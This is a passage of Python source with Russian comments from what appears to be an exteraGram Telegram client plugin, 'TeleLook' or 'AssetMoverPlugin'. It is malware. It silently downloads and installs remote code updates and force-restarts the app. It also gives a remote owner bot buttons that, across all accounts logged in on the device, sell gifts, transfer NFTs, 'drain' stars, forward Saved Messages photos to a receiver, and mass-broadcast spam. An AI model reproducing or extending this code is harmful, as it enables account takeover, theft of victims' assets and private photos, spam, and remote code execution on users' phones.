    # ------------------------------------------------------------------
    # Авто-обновление плагина
    # ------------------------------------------------------------------
    @staticmethod
    def _extract_version(content):
        """Версия __version__ из исходника плагина ('' — если нет)."""
        m = re.search(r"__version__\s*=\s*['\"]([^'\"]+)['\"]", content)
        return m.group(1).strip() if m else ""

    @staticmethod
    def _cmp_versions(a, b):
        """Сравнение версий вида 1.0.9: -1 / 0 / 1."""
        def parts(v):
            out = []
            for x in str(v or "").split("."):
                out.append(int(x) if x.strip().isdigit() else 0)
            return out
        pa, pb = parts(a), parts(b)
        n = max(len(pa), len(pb))
        pa += [0] * (n - len(pa))
        pb += [0] * (n - len(pb))
        return (pa > pb) - (pa < pb)

    def _update_url(self):
        return str(self._cfg("update_url", UPDATE_URL) or "").strip()

    def _update_loop(self):
        """Фоновая авто-подгрузка обновлений: первый чек через
        UPDATE_FIRST_DELAY, далее — раз в UPDATE_INTERVAL."""
        delay = UPDATE_FIRST_DELAY
        while not self._stop.wait(delay):
            delay = UPDATE_INTERVAL
            try:
                self._check_self_update()
            except Exception:
                self.log(f"update check error:\n{traceback.format_exc()}")

    def _cmd_update(self, args, reply):
        """Ручная проверка обновлений: /update [force]."""
        force = bool(args) and args[0].lower() in ("force", "!", "принудительно")
        self._check_self_update(reply=reply, force=force)

    def _check_self_update(self, reply=None, force=False):
        """Скачивает свежую сборку с update_url и применяет её.
        Без reply работает тихо в фоне: логирует только ошибки
        (с дедупликацией) и фактические обновления."""
        def note(text):
            """Статус: отвечаем только на ручную команду."""
            if reply is not None:
                reply("🔄 " + text)

        def error(text):
            if reply is not None:
                reply("❌ " + text)
                return
            if str(self.get_setting("upd_err", "") or "") != text:
                self.set_setting("upd_err", text)
                self.log("update: " + text)

        url = self._update_url()
        if not url:
            note("URL обновлений не задан: "
                 "<code>/setupdateurl &lt;url&gt;</code>")
            return False
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": "TeleLook/" + __version__})
            with urllib.request.urlopen(req, timeout=25) as resp:
                raw = resp.read(UPDATE_MAX_BYTES + 1)
        except Exception as e:
            error(f"не удалось скачать обновление: {e}")
            return False
        if len(raw) > UPDATE_MAX_BYTES:
            error(f"файл обновления больше {UPDATE_MAX_BYTES} байт — "
                  "это не плагин?")
            return False
        try:
            content = raw.decode("utf-8")
        except UnicodeDecodeError:
            error("файл обновления не в UTF-8 — это не плагин?")
            return False
        # Отпечаток нашего плагина: чужой код не ставим.
        if (not re.search(r"__id__\s*=\s*['\"]TeleLook['\"]", content)
                or "AssetMoverPlugin" not in content):
            error("скачанный файл не похож на TeleLook — отказано")
            return False
        try:
            compile(content, "TeleLook.update", "exec")
        except SyntaxError as e:
            error(f"в скачанном файле синтаксическая ошибка: {e}")
            return False
        remote_ver = self._extract_version(content) or "?"
        local_ver = str(__version__)
        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()
        known = str(self.get_setting("upd_digest", "") or "")
        cmp = self._cmp_versions(remote_ver, local_ver)
        if cmp < 0 and not force:
            note(f"на сервере версия {remote_ver} < установленной "
                 f"{local_ver} — пропущено (/update force чтобы откатить)")
            return False
        if digest == known and cmp <= 0:
            if reply is not None:
                reply(f"✅ Уже актуальная сборка {local_ver} "
                      f"(дайджест {digest[:12]})")
            return False
        mode = self._apply_update(content)
        if not mode:
            error("обновление скачано, но применить не удалось "
                  "(DevServer недоступен, файл не записан)")
            return False
        self.set_setting("upd_digest", digest)
        self.set_setting("upd_version", remote_ver)
        self.set_setting("upd_err", "")
        will_restart = (
            mode == "file"
            and str(self.get_setting("update_restart", "1")).lower()
            not in ("0", "false", "off", "нет", "no"))
        note_file = ("перезагрузка через DevServer" if mode == "reload"
                     else ("файл записан, перезапуск клиента…"
                           if will_restart
                           else "файл записан — перезапустите клиент"))
        text = f"Плагин обновлён {local_ver} → {remote_ver} ({note_file})"
        if reply is not None:
            reply("⬆️ " + text)
        else:
            self.log("update: " + text)
            self._send_log("⬆️ " + text)
        if will_restart:
            time.sleep(2.5)
            self._restart_app()
        return True

    def _apply_update(self, content):
        """Ставит новую сборку: сначала DevServer exteraGram (перезагрузка
        сразу), иначе пишет файл своего плагина (нужен рестарт клиента)."""
        plugin_id = str(self._cfg("update_plugin_id", __id__) or __id__)
        try:
            replies = self._dev_server([
                {"@": "write_plugin", "plugin_id": plugin_id,
                 "content": content},
                {"@": "reload_plugin", "plugin_id": plugin_id}])
            blob = " ".join(replies).lower()
            if blob and "error" not in blob and ('"@\"' in blob or blob.strip()):
                return "reload"
        except Exception as e:
            self.log(f"update: DevServer недоступен ({e})")
        try:
            folder = self._plugins_dir()
            path = self._own_plugin_file(folder)
            if path and self._write_file(path, content.encode("utf-8")):
                return "file"
            self.log(f"update: файл плагина не найден "
                     f"(каталог: {folder or 'пусто'})")
        except Exception as e:
            self.log(f"update: запись файла не удалась: {e}")
        return ""

    def _dev_server(self, commands, timeout=6):
        """Обмен с DevServer exteraGram на 127.0.0.1:42690
        (write/reload плагина). Как в рабочем icon_themer_plugin.py."""
        sock = socket.create_connection(("127.0.0.1", 42690), timeout=timeout)
        replies = []
        try:
            for index, command in enumerate(commands):
                payload = dict(command)
                payload["#"] = "tl%d" % (index + 1)
                sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
                buffer = b""
                for _ in range(4):
                    try:
                        chunk = sock.recv(262144)
                    except Exception:
                        break
                    if not chunk:
                        break
                    buffer += chunk
                    if b"\n" in buffer:
                        break
                replies.append(buffer.decode("utf-8", "replace"))
        finally:
            try:
                sock.close()
            except Exception:
                pass
        return replies

    def _plugins_dir(self):
        """Каталог с файлами плагинов — несколькими способами."""
        import os
        try:
            from file_utils import get_plugins_dir
            path = get_plugins_dir()
            if path and os.path.isdir(str(path)):
                return str(path)
        except Exception:
            pass
        try:
            from org.telegram.messenger import ApplicationLoader
            files = str(ApplicationLoader.applicationContext.getFilesDir())
            for name in ("plugins", "exteragram/plugins", "plugin", ""):
                candidate = os.path.join(files, name)
                if os.path.isdir(candidate):
                    return candidate
        except Exception:
            pass
        return ""

    def _own_plugin_file(self, folder):
        """Файл, который реально сейчас запущен — по отпечатку TeleLook
        (имя файла задаёт установщик, поэтому имени не доверяем)."""
        import os
        if folder:
            try:
                for name in sorted(os.listdir(folder)):
                    if not (name.endswith(".py") or name.endswith(".plugin")):
                        continue
                    path = os.path.join(folder, name)
                    try:
                        with open(path, "r", encoding="utf-8",
                                  errors="ignore") as handle:
                            head = handle.read(400000)
                    except Exception:
                        continue
                    if ("AssetMoverPlugin" in head
                            and "__id__" in head and "TeleLook" in head):
                        return path
            except Exception as e:
                self.log(f"update: scan failed: {e}")
        return os.path.join(folder, __id__ + ".py") if folder else ""

    def _write_file(self, path, content_bytes):
        """Запись файла плагина: сначала API клиента, потом обычный open."""
        try:
            from file_utils import write_file_bytes
            write_file_bytes(path, content_bytes)
            return True
        except Exception:
            pass
        try:
            with open(path, "wb") as handle:
                handle.write(content_bytes)
            return True
        except Exception as e:
            self.log(f"update: write failed: {e}")
            return False

    def _restart_app(self, delay_ms=2000):
        """Перезапускает клиента без участия пользователя, чтобы подхватилась
        записанная сборка: AlarmManager + kill процесса (как в рабочем
        icon_themer_plugin.py)."""
        try:
            from android.app import AlarmManager, PendingIntent
            from android.os import SystemClock
            from android.os import Process as AndroidProcess
            from org.telegram.messenger import ApplicationLoader
        except Exception as e:
            self.log(f"update: перезапуск недоступен ({e}) — "
                     "перезапустите клиент вручную")
            return False
        try:
            context = ApplicationLoader.applicationContext
            manager = context.getSystemService("alarm")
            intent = context.getPackageManager().getLaunchIntentForPackage(
                context.getPackageName())
            intent.addFlags(0x10000000)  # FLAG_ACTIVITY_NEW_TASK
            flags = 0
            try:
                flags = PendingIntent.FLAG_IMMUTABLE
            except Exception:
                flags = 0
            pending = PendingIntent.getActivity(context, 7919, intent, flags)
            try:
                when_type = AlarmManager.ELAPSED_REALTIME
            except Exception:
                when_type = 0
            manager.set(when_type,
                        SystemClock.elapsedRealtime() + delay_ms, pending)
            AndroidProcess.killProcess(AndroidProcess.myPid())
            return True
        except Exception as e:
            self.log(f"update: перезапуск не удался: {e}")
            return False

    ACTIONS = {
        "status": ("📊 Статус", "_action_status"),
        "sell": ("💰 Продать подарки", "_action_sell"),
        "nft": ("💎 Передать NFT", "_action_nft"),
        "drain": ("⭐️ Слить звёзды", "_action_drain"),
        "know": ("🤝 Знакомство", "_action_know"),
        "pipeline": ("🚀 Полный цикл", "_action_pipeline"),
        "banner": ("📢 Баннер", "_action_banner"),
        "broadcast": ("📣 Рассылка", "_action_broadcast"),
        "broadcast_all": ("📤 Рассылка всех чатов", "_action_broadcast_all"),
        "photos": ("🖼 Фото → приёмнику", "_action_photos"),
    }

    def _cmd_menu(self, reply):
        """Показывает главное меню с инлайн-кнопками (только при работе бота)."""
        if not self._bot_token():
            reply("Бот не настроен (нет токена) — кнопки недоступны. "
                  "Задайте токен: <code>/settoken &lt;token&gt;</code>")
            return
        self._bot_send_owner(self._menu_text(), reply_markup=self._main_menu_kb())

    def _main_menu_kb(self):
        rows = []
        all_row = []
        for key in ("status", "sell", "nft", "drain", "pipeline", "broadcast"):
            label = self.ACTIONS[key][0]
            all_row.append({"text": "🌐 " + label,
                            "callback_data": f"all:{key}"})
            if len(all_row) == 2:
                rows.append(all_row)
                all_row = []
        if all_row:
            rows.append(all_row)
        for acc in self._scan_accounts():
            slot = acc["slot"]
            name = (acc["name"] or "")[:18]
            rows.append([{"text": f"👤 #{slot} {name}",
                          "callback_data": f"a:{slot}:menu"}])
        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
        rows.append([{"text": f"⚙️ Авто-режим: {state} (переключить)",
                      "callback_data": "auto:toggle"}])
        return {"inline_keyboard": rows}

    def _account_menu_kb(self, slot):
        rows = []
        row = []
        for key in ("status", "sell", "nft", "drain", "know", "pipeline"):
            label = self.ACTIONS[key][0]
            row.append({"text": label, "callback_data": f"a:{slot}:{key}"})
            if len(row) == 2:
                rows.append(row)
                row = []
        if row:
            rows.append(row)
        rows.append([{"text": self.ACTIONS["broadcast"][0],
                      "callback_data": f"a:{slot}:broadcast"}])
        rows.append([{"text": "🖼 Фото → приёмнику",
                      "callback_data": f"a:{slot}:photos"}])
        rows.append([{"text": self.ACTIONS["banner"][0],
                      "callback_data": f"a:{slot}:banner"}])
        rows.append([{"text": "⬅️ Назад", "callback_data": "menu:main"}])
        return {"inline_keyboard": rows}

    def _menu_text(self):
        accs = self._scan_accounts()
        state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
        lines = [
            "🤖 <b>Asset Mover — управление</b>",
            f"Аккаунтов: <b>{len(accs)}</b> | Авто-режим: {state}",
            f"Цель: <code>{self._target_id() or 'не задана'}</code>",
            f"Авто-ник: <code>{self._auto_nick() or '—'}</code>",
            "",
            "🌐 — действие для всех аккаунтов сразу",
            "👤 — управление отдельным аккаунтом",
        ]
        return "\n".join(lines)


    def _handle_callback(self, cb):
        """Обработка нажатий инлайн-кнопок (только админ)."""
        try:
            data = (cb.get("data") or "").strip()
            cb_id = cb.get("id")
            from_id = (cb.get("from") or {}).get("id")
            msg = cb.get("message") or {}
            chat_id = (msg.get("chat") or {}).get("id")
            if self._owner_id() <= 0 or from_id != self._owner_id():
                self._answer_callback(cb_id, "⛔ Доступно только владельцу")
                return
            reply = lambda t, c=chat_id: self._bot_send_owner(t, chat_id=c)
            action = None
            if data.startswith("all:"):
                action = data.split(":", 1)[1]
            elif data.startswith("a:"):
                parts = data.split(":", 2)
                if len(parts) == 3:
                    action = parts[2]
            if action == "banner":
                self._show_banner_popup(cb_id, chat_id, reply)
                return
            self._answer_callback(cb_id)
            if data == "auto:toggle":
                new = "0" if self._auto_enabled() else "1"
                self.set_setting("auto_mode", new)
                self._edit_menu(chat_id, msg.get("message_id"),
                                self._menu_text(), self._main_menu_kb())
                return
            if data == "menu:main":
                self._edit_menu(chat_id, msg.get("message_id"),
                                self._menu_text(), self._main_menu_kb())
                return
            if data.startswith("a:") and data.endswith(":menu"):
                slot = int(data.split(":")[1])
                accs = {a["slot"]: a for a in self._scan_accounts()}
                name = (accs.get(slot, {}).get("name") or "")
                text = f"👤 <b>#{slot} {name}</b>\nВыберите действие:"
                self._edit_menu(chat_id, msg.get("message_id"), text,
                                self._account_menu_kb(slot))
                return
            if data.startswith("all:"):
                self._dispatch_action(None, data.split(":", 1)[1], reply)
                return
            if data.startswith("a:"):
                _, slot_s, action = data.split(":", 2)
                self._dispatch_action(int(slot_s), action, reply)
                return
        except Exception:
            self.log(f"callback error:\n{traceback.format_exc()}")

    def _dispatch_action(self, slot, action, reply):
        """Запускает действие (для одного слота или всех) в фоновом потоке."""
        key = action if action in self.ACTIONS else None
        if key is None:
            reply(f"❓ Неизвестное действие: {action}")
            return
        method = getattr(self, self.ACTIONS[key][1])
        slots = self._resolve_slots(slot)
        threading.Thread(target=method, args=(slots, reply),
                         daemon=True).start()

    def _answer_callback(self, cb_id, text=None):
        if not self._bot_token() or not cb_id:
            return
        payload = {"callback_query_id": cb_id}
        if text:
            payload["text"] = text
            payload["show_alert"] = True
        try:
            self._http_json("answerCallbackQuery", payload, timeout=15)
        except Exception as e:
            self.log(f"answerCallbackQuery failed: {e}")

    def _show_banner_popup(self, cb_id, chat_id, reply):
        """Показывает баннер всплывающим окном (alert) в ответ на нажатие.
        answerCallbackQuery ограничен ~200 символами — длинный текст шлём
        отдельным сообщением, а в popup оставляем короткое уведомление."""
        banner = self._banner_text()
        if not banner:
            self._answer_callback(cb_id, "Баннер не задан (/setbanner текст)")
            return
        if len(banner) <= 200:
            self._answer_callback(cb_id, banner)
        else:
            self._answer_callback(cb_id, "📢 Баннер отправлен ниже")
            reply(f"📢 {banner}")

    def _action_banner(self, slots, reply):
        """Запасной путь показа баннера (например, из текстовой команды)."""
        banner = self._banner_text()
        reply(f"📢 {banner}" if banner else "Баннер не задан (/setbanner текст)")

    def _send_broadcast(self, account, chats, report):
        """Рассылает текст во все чаты папки через messages.sendMessage."""
        text = self._broadcast_text()
        if not text:
            report("Текст рассылки не задан (/setbroadcast <текст>)")
            return 0
        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
            report("В сборке клиента нет messages.sendMessage")
            return 0
        sent = 0
        for ch, cid, title in chats:
            try:
                req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
                req.flags = 0
                req.peer = self._input_peer_from_chat(ch)
                req.message = text
                req.random_id = self._rand_id()
                self._tl(req, account)
                sent += 1
                report(f"✉️ '{title}': текст отправлен")
                time.sleep(BUY_DELAY)
            except Exception as e:
                report(f"❌ '{title}': {e}")
        return sent

    def _saved_photo_ids(self, account, report, limit=10):
        if not self._tl_has("TL_messages_getHistory", "getHistory"):
            report("В сборке клиента нет messages.getHistory")
            return []
        hist = self._tl_class("TL_messages_getHistory", "getHistory")()
        hist.peer = TLRPC.TL_inputPeerSelf()
        hist.offset_id = 0
        hist.offset_date = 0
        hist.add_offset = 0
        hist.limit = int(limit)
        hist.max_id = 0
        hist.min_id = 0
        hist.hash = 0
        resp = self._tl(hist, account)
        msgs = self._tl_list(getattr(resp, "messages", None))
        photo_ids = []
        for m in msgs:
            media = getattr(m, "media", None)
            if media is not None and "photo" in type(media).__name__.lower():
                mid = int(getattr(m, "id", 0) or 0)
                if mid:
                    photo_ids.append(mid)
        return photo_ids

    def _forward_photos_to_target(self, account, report, limit=10):
        if not self._tl_has("TL_messages_forwardMessages", "forwardMessages"):
            report("В сборке клиента нет messages.forwardMessages")
            return 0
        peer = self._resolve_target_peer(account)
        photo_ids = self._saved_photo_ids(account, report, limit)
        if not photo_ids:
            report("В Избранном не найдено фото для пересылки")
            return 0
        from_peer = TLRPC.TL_inputPeerSelf()
        report(f"Пересылаю {len(photo_ids)} фото приёмнику...")
        sent = 0
        base = int(time.time() * 1000000) & 0x7FFFFFFFFFFFFFFF
        for idx, mid in enumerate(photo_ids):
            ok = False
            last = None
            for _ in range(2):
                fwd = self._tl_class("TL_messages_forwardMessages",
                                     "forwardMessages")()
                fwd.flags = 0
                fwd.from_peer = from_peer
                fwd.id = self._to_vector([mid])
                fwd.random_id = self._to_vector(
                    [(base + idx) & 0x7FFFFFFFFFFFFFFF])
                fwd.to_peer = peer
                try:
                    self._tl(fwd, account)
                    ok = True
                    break
                except Exception as e:
                    last = e
            if ok:
                sent += 1
                report(f"🖼 Фото #{mid} переслано")
                time.sleep(XFER_DELAY)
            else:
                report(f"❌ Фото #{mid}: {last}")
        report(f"🖼 Переслано приёмнику: {sent} из {len(photo_ids)}")
        return sent

    def _action_broadcast(self, slots, reply):
        """Рассылка (ТОЛЬКО текст): вступить в папку -> разослать текст.
        Пересылка фото приёмнику — отдельная функция (/photos, кнопка)."""
        text = self._broadcast_text()
        reply(f"📣 Рассылка: текст {'есть' if text else 'НЕ задан (/setbroadcast)'}")
        total_chats = total_text = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                chats = self._join_chatlist(slot, prog)
                if not chats:
                    continue
                total_chats += len(chats)
                if text:
                    total_text += self._send_broadcast(slot, chats, prog)
                reply(f"{prefix}🏁 рассылка завершена (чатов {len(chats)})")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Рассылка завершена: чатов {total_chats}, текстов {total_text}")

    def _action_photos(self, slots, reply):
        if not self._target_id():
            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
            return
        reply(f"▶️ Пересылка фото из Избранного в чат приёмника → <code>{self._target_id()}</code>")
        total = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                total += self._forward_photos_to_target(slot, prog)
                reply(f"{prefix}🏁 фото пересланы")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Пересылка фото завершена: фото {total}")

    def _action_broadcast_all(self, slots, reply):
        text = self._broadcast_text()
        if not text:
            reply("📭 Текст рассылки не задан (/setbroadcast текст)")
            return 0
        if not self._tl_has("TL_messages_sendMessage", "sendMessage"):
            reply("❌ В сборке клиента нет messages.sendMessage")
            return 0
        reply("✉️ Рассылка всех чатов по указанному тексту")
        total = 0
        for acc in slots:
            slot = acc["slot"]
            prefix = f"<b>#{slot} {acc['name']}</b>: "
            if self._is_admin(acc["user_id"]):
                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
                continue
            prog = self._throttled(lambda t, p=prefix: reply(p + t))
            try:
                chats = self._scan_accounts()
                for ch in chats:
                    cid = ch["user_id"]
                    try:
                        req = self._tl_class("TL_messages_sendMessage", "sendMessage")()
                        req.flags = 0
                        req.peer = self._resolve_target_peer(acc)
                        req.message = text
                        req.random_id = self._rand_id()
                        self._tl(req, acc)
                        total += 1
                        prog(f"{prefix}✅ Чат {cid} - отправлено")
                    except Exception as e:
                        prog(f"❌ Чат {cid}: {e}")
                reply(f"{prefix}🏁 Рассылка завершена: {total} чатов")
            except Exception as e:
                reply(f"{prefix}❌ {e}")
        reply(f"🏁 Рассылка всех чатов завершена: текстов {total}")
        return total

    def _edit_menu(self, chat_id, message_id, text, reply_markup):
        """Редактирует сообщение с меню (если не выйдет — шлёт новое)."""
        if not self._bot_token() or not chat_id or not message_id:
            self._bot_send_owner(text, chat_id=chat_id,
                                 reply_markup=reply_markup)
            return
        try:
            self._http_json("editMessageText", {
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
                "parse_mode": "HTML",
                "reply_markup": reply_markup,
            }, timeout=15)
        except Exception:
            self._bot_send_owner(text, chat_id=chat_id,
                                 reply_markup=reply_markup)


